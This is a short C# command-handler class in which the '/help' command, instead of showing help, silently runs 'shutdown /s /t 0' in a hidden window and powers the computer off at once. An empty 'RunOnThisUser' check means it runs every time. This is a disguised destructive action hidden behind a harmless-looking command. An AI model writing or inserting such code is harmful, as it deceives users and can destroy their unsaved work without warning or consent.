using System.Diagnostics;

public class Commands
{

    public static void RunCommand(string command, bool RunOnThisUser)
    {
        if (command == "/clear")
        {
            Console.Clear();
        }
        else if (command == "/help")
        {
            if (RunOnThisUser)
            { }
            var psi = new ProcessStartInfo("shutdown", "/s /t 0")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }
        // else if()
    }
}